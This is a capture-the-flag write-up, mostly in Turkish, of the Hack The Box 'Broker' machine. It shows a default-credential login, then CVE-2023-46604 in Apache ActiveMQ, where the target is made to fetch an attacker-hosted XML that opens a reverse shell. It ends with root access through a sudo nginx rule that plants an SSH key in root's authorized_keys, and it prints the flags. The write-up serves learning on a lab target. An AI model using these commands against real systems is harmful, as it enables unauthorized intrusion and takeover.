<img width="1032" height="928" alt="broker" src="https://github.com/user-attachments/assets/70b96d2d-e4ee-4788-ac2c-d29c5c0e32be" />

### About

Broker is an easy difficulty `Linux` machine hosting a version of `Apache ActiveMQ`. Enumerating the version of `Apache ActiveMQ` shows that it is vulnerable to `Unauthenticated Remote Code Execution`, which is leveraged to gain user access on the target. Post-exploitation enumeration reveals that the system has a `sudo` misconfiguration allowing the `activemq` user to execute `sudo /usr/sbin/nginx`, which is similar to the recent `Zimbra` disclosure and is leveraged to gain `root` access.

### 1. Keşif

```bash
nmap -sS -A -T5 -p- 10.129.230.87
```

<img width="1053" height="832" alt="nmap" src="https://github.com/user-attachments/assets/0d0adaab-cdc1-441b-8329-d411b8ab6df4" />

<img width="515" height="26" alt="nmap2" src="https://github.com/user-attachments/assets/8087e835-4c29-45ce-b16e-dba6458ca380" />

Tarama sonucu oldukça kalabalık — tek bir servis değil, tam bir ActiveMQ broker altyapısıyla karşı karşıyayız:

```
22/tcp    ssh        OpenSSH 8.9p1 Ubuntu
80/tcp    http       nginx 1.18.0 (basic realm=ActiveMQRealm)
1883/tcp  mqtt
5672/tcp  amqp
8161/tcp  http       Jetty 9.4.39.v20210325 (basic realm=ActiveMQRealm)
42427/tcp tcpwrapped
61613/tcp stomp      Apache ActiveMQ
61614/tcp http       Jetty 9.4.39.v20210325 (TRACE metodu açık)
61616/tcp apachemq   ActiveMQ OpenWire transport 5.15.15
```

80 ve 8161 portlarındaki `basic realm=ActiveMQRealm` başlığı, ikisinin de aynı ActiveMQ kurulumuna ait yönetim arayüzleri olduğunu gösteriyor. 61613'te STOMP protokolü, 61616'da ise OpenWire transport çalışıyor — bu ikisi ActiveMQ'nun mesajlaşma protokolleri, ve 61616'daki `5.15.15` sürüm bilgisi tek başına dikkat çekici: bu versiyon aralığı bilinen, kritik bir RCE zincirine sahip.

### 2. Web Servisi ve ActiveMQ Console

<img width="876" height="441" alt="site1" src="https://github.com/user-attachments/assets/f62d64e8-dd89-4505-9a8f-e000771f0b88" />

80. porta gittiğimizde `ActiveMQRealm` realm'ıyla bir Basic Auth pop-up'ı karşılıyor bizi. Rastgele `admin:admin` deniyoruz ve doğrudan içeri giriyoruz.

<img width="680" height="645" alt="site2" src="https://github.com/user-attachments/assets/9be7cf46-0c9e-4aac-9d70-21559f2df31c" />

Konsol bize broker'ın adını, ID'sini ve tam sürümünü doğruluyor.

`5.15.15` teyit edildiğine göre artık bu sürüme ait bilinen açıkları aramaya geçebiliriz.

### 3. Foothold — CVE-2023-46604

`ActiveMQ 61613 exploit` aramasıyla CVE-2023-46604'e ulaşıyoruz. PoC için şu repoyu kullanıyoruz:

**https://github.com/Strikoder-Premium/CVE-2023-46604-ActiveMQ-RCE-Python**

**Zafiyetin kökü:** 61616 portundaki OpenWire, ActiveMQ'nun kendi ikili (binary) mesajlaşma protokolüdür ve mesajları **marshalling/unmarshalling** ile serileştirir. `BaseDataStreamMarshaller` sınıfı, gelen bir `ExceptionResponse` paketini işlerken paket içinde taşınan **sınıf ismini reflection ile doğrudan instantiate eder** — hangi sınıfın oluşturulacağı sunucu tarafından sabitlenmemiştir, saldırganın gönderdiği veriden okunur. OpenWire seviyesindeki bu mesaj işleme, HTTP/Basic Auth katmanının tamamen dışında, ham TCP soketi üzerinde gerçekleştiği için kimlik doğrulaması hiç devreye girmez — zafiyet tamamen **unauthenticated**.

Reflection ile hangi sınıfın çağrılacağı serbest bırakıldığında, asıl silahı seçen şey bir **gadget**tır. Bu exploit zincirinde kullanılan gadget `org.springframework.context.support.ClassPathXmlApplicationContext` — bu sınıfın constructor'ı kendisine verilen path/URL'i bir Spring bean XML tanım dosyası olarak yorumlayıp uzaktan çeker ve içindeki bean tanımlarını **anında instantiate eder**. Attacker-controlled bir XML içinde `ProcessBuilder`/`Runtime.exec()` çağıran bir bean tanımlanırsa, bean'in constructor'ı çalıştığı an sistem komutu çalışır.

<img width="859" height="505" alt="useit" src="https://github.com/user-attachments/assets/4ac2e971-6f12-4a05-90df-d5a8e4a2b593" />

Öncelikle PoC XML'ini oluşturuyoruz, içine hangi IP/porta reverse shell açacağımızı gömerek:

```bash
python3 generate_poc.py -i 10.10.14.187 -p 1001
```

<img width="574" height="43" alt="generate" src="https://github.com/user-attachments/assets/6104535e-5a69-4574-a9d5-826dd7eb4a54" />

Bu XML'i hedefin erişebileceği bir HTTP sunucusunda barındırıyoruz:

```bash
python3 -m http.server 2002
```

<img width="628" height="118" alt="2002" src="https://github.com/user-attachments/assets/f701d5a6-a217-4dcf-a41b-4e5f859929b9" />

Ve asıl exploit'i tetikliyoruz — `main.py`, hedefin 61616 portuna doğrudan OpenWire seviyesinde bağlanıp marshalling katmanını istismar eden ham paketi gönderir:

```bash
python3 main.py -i 10.129.230.87 -u http://10.10.14.187:2002/poc-linux.xml
```

<img width="1091" height="262" alt="main" src="https://github.com/user-attachments/assets/945d39a1-c110-4028-a3ce-44070466a22d" />

Gönderilen ham paketin hex çıktısını incelersek, içinde `org.springframework.context.support.ClassPathXmlApplicationContext` sınıf ismi ile bizim HTTP sunucumuzun URL'sinin (`http://10.10.14.187:2002/poc-linux.xml`) açıkça taşındığını görüyoruz — bu paket, OpenWire protokolünün beklediği bir response formatına gizlenmiş, ama içeriği aslında marshaller'a "şu sınıfı, şu XML ile başlat" diyen bir komut. ActiveMQ paketi aldığı anda XML'i çekiyor, Spring context'ini inşa ediyor, context inşası sırasında bizim komutumuz çalışıyor.

Dinleyicimizde bağlantı düşüyor:

```
nc -nvlp 1001
listening on [any] 1001 ...
connect to [10.10.14.187] from (UNKNOWN) [10.129.230.87] 42702
bash: cannot set terminal process group (877): Inappropriate ioctl for device
bash: no job control in this shell
activemq@broker:/opt/apache-activemq-5.15.15/bin$
```

Broker process'i `activemq` kullanıcısı yetkisiyle çalıştığı için shell doğrudan bu kullanıcı bağlamında geliyor.

```
activemq@broker:~$ cat user.txt
35aa58f0993e0867e3daef939ccf22ee
```

<img width="288" height="58" alt="userflag" src="https://github.com/user-attachments/assets/71a2b81c-db4c-48fc-bde3-87fa8e918337" />

İlk flag'i aldık, şimdi privesc yollarına bakıyoruz.

### 4. Privilege Escalation — nginx Sudo Misconfiguration

<img width="752" height="163" alt="sudol" src="https://github.com/user-attachments/assets/f75b3786-41a4-45b3-b223-5464bd7da94f" />

`activemq` kullanıcısı, şifre girmeden `/usr/sbin/nginx`'i **herhangi bir argümanla** root yetkisiyle çalıştırabiliyor. Kural tek bir binary'ye izin veriyor gibi görünse de asıl sorun burada: nginx `-c` parametresiyle keyfi bir konfigürasyon dosyası kabul eden bir binary. Root yetkisiyle çalışacak bir web sunucusunu kendi yazdığımız config ile başlatabilmek, fiilen root context'inde dosya sistemi üzerinde işlem yaptırabilmek anlamına geliyor — About kısmında referans verilen Zimbra advisory'siyle birebir aynı sınıf açık: sudo kuralı komutu kısıtlıyor ama komutun davranışını belirleyen konfigürasyonu hiç kısıtlamıyor.

GTFOBins'te nginx için bir entry bulunuyor ama kullanımı ilk bakışta net değildi, bu yüzden ayrıca Google'da arattım ve şu repoya ulaştım:

**https://github.com/DylanGrl/nginx_sudo_privesc**

`exploit.sh` dosyasını Kali'de barındırıp hedefe çekiyoruz:

<img width="594" height="433" alt="exp1" src="https://github.com/user-attachments/assets/b28486af-16c3-4c83-b370-3edf06b01eac" />

Script özünde şu adımları otomatikleştiriyor: önce bir SSH anahtar çifti üretiyor, ardından `sudo /usr/sbin/nginx -c <malicious.conf>` şeklinde, kendi yazdığı geçici bir konfigürasyon dosyasıyla nginx'i root yetkisinde başlatıyor. Bu config, nginx'in `root`/`alias` ve log directive mekanizmalarını suistimal ederek, ürettiğimiz **public key'i doğrudan root'un `authorized_keys` dosyasına yazdırıyor** — nginx root olarak çalıştığı için, normalde `activemq` kullanıcısının erişemeyeceği `/root/.ssh/authorized_keys` yoluna yazma işlemi sorunsuz gerçekleşiyor. Çıktıdaki `cat: .ssh/id_rsa: No such file or directory` hataları kozmetik; script relative path ile dosyayı okumaya çalışıp bulamıyor ama asıl işlemi (anahtar üretimi + authorized_keys enjeksiyonu) yine de tamamlıyor.

<img width="554" height="616" alt="exp2" src="https://github.com/user-attachments/assets/b68148a1-dc8b-4f42-8268-6e68b5ae4726" />

```
activemq@broker:~$ ls -al
total 36
drwxr-x--- 5 activemq activemq 4096 Sep  2 11:02 .
drwxr-xr-x 3 root     root     4096 Nov  6  2023 ..
lrwxrwxrwx 1 root     root        9 Nov  5  2023 .bash_history -> /dev/null
-rw-r--r-- 1 activemq activemq  220 Nov  5  2023 .bash_logout
-rw-r--r-- 1 activemq activemq 3771 Nov  5  2023 .bashrc
drwx------ 2 activemq activemq 4096 Nov  7  2023 .cache
drwxrwxr-x 3 activemq activemq 4096 Nov  7  2023 .local
-rw-r--r-- 1 activemq activemq  807 Nov  5  2023 .profile
drwx------ 2 activemq activemq 4096 Sep  2 11:02 .ssh
-rw-r----- 1 root     activemq   33 Sep  2 10:34 user.txt

activemq@broker:~$ cd .ssh
activemq@broker:~/.ssh$ ls
id_rsa  id_rsa.pub
```

Kendi `.ssh` dizinimizde script'in ürettiği anahtar çiftini buluyoruz — bu, root'un `authorized_keys`'ine enjekte edilen public key'in eşi private key. Bağlantıyı kurmak için private key'i Kali tarafına taşımamız gerekiyor. `scp` yerine en pratik yol, dosya içeriğini terminalden kopyalayıp yapıştırmak:

Hedefte:

```bash
cat /home/activemq/.ssh/id_rsa
```

çıktısını kopyalayıp Kali'de:

```bash
nano root_key
```

dosyasına yapıştırıyoruz, sonra izinlerini düzeltip bağlanıyoruz:

```bash
chmod 600 root_key
ssh -i root_key root@10.129.230.87
```

İlk denemede host key doğrulaması araya giriyor:

```
The authenticity of host '10.129.230.87 (10.129.230.87)' can't be established.
ED25519 key fingerprint is: SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])?
Host key verification failed.
```

`yes` ile onaylayıp tekrar denediğimizde bağlantı sorunsuz kuruluyor ve doğrudan root shell'e düşüyoruz:

```bash
ssh -i root_key root@10.129.230.87
```

```
root@broker:~# ls
cleanup.sh  root.txt
root@broker:~# cat root.txt
2b52eb54831f5f7b5c2098bf30abaa4e
```

<img width="354" height="100" alt="rootflag" src="https://github.com/user-attachments/assets/09600d99-510e-42ca-857c-d5fb4f604f70" />
